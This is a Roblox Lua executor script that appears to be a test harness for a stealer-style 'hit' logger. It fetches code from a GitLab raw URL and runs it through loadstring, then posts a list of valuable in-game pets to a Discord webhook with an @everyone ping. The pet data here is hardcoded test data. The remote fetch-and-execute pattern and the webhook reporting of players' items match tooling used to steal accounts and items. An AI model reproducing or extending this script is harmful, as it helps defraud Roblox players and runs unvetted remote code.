-- Services
local HttpService = game:GetService("HttpService")

-- Load emoji table from GitLab
local success, Brainrots = pcall(function()
    return loadstring(game:HttpGet("https://gitlab.com/nolag-idp-group/emojisforstlr/-/raw/main/stlr"))()
end)

if not success then
    warn("Failed to load emoji table!")
    Brainrots = {}
end

-- Webhook (replace with your real one)
local WEBHOOK = "PASTE_YOUR_WEBHOOK_HERE"

-- Example pets
local testPets = {
    {name="Dragon Cannelloni", value="20M/s", floor="2nd Floor", num=2e7},
    {name="Los Spaghettis", value="5M/s", floor="1st Floor", num=5e6},
    {name="Unknown Brainrot", value="1M/s", floor="1st Floor", num=1e6}
}

-- Build message with emojis
local lines = {}
for _, pet in ipairs(testPets) do
    local emoji = Brainrots[pet.name] or "ðŸ§ "  -- fallback to ðŸ§ 
    table.insert(lines, string.format("%s %s â†’ %s â†’ %s", emoji, pet.name, pet.value, pet.floor))
end

-- Send to webhook
local payload = {
    content = "@everyone Test Brainrots",
    embeds = {{
        title = "Test Brainrot Hit",
        color = 123456,
        fields = {
            {name="Brainrots", value=table.concat(lines, "\n")}
        }
    }},
    allowed_mentions = {parse={"everyone"}}
}

-- Use executor request function
local req = (syn and syn.request) or http_request or (http and http.request) or request
if req and WEBHOOK ~= "" then
    local ok, err = pcall(function()
        req({
            Url = WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
    if ok then
        print("Webhook test sent successfully!")
    else
        warn("Webhook test failed:", err)
    end
else
    warn("No request function available or webhook missing")
end
